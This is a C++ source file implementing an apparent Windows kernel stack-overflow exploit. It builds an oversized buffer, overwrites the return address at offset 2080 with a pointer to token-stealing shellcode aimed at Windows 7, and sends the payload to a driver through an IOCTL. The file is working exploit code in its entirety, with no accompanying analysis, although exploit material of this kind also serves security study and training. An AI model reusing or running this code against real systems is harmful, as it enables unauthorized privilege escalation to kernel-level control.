#include "StackOverflow.h"

bool 
ExploitStackOverflow::exploit() {
	
	static const size_t Buffer_Size = sizeof(ULONG) * (512 + 32);
	static const size_t EIP_Overwrite_Offset = 2080;
	static const void* Shellcode_Ptr = reinterpret_cast<void*>(&token_stealing_win7);
	
	shared_ptr<UCHAR> buffer(
		new UCHAR[Buffer_Size]
	);
	
	if(!buffer) {
		wcerr << L"[!] Could not allocate buffer for input payload." << endl;
		return false;
	}
	
	memset(buffer.get(), 'A', Buffer_Size);

	*(reinterpret_cast<DWORD*>(&buffer.get()[EIP_Overwrite_Offset])) = 
		reinterpret_cast<DWORD>(Shellcode_Ptr);
	
	wcout << L"[?] Kernel shellcode in user-memory at: 0x" << hex << setw(8) << setfill(L'0')
			<< reinterpret_cast<DWORD>(&token_stealing_win7) << endl;
	
	bool ret = driver.SendIOCTL (
		ExploitStackOverflow::Ioctl_Code,
		buffer.get(),
		Buffer_Size
	);
	
	return ret;
}
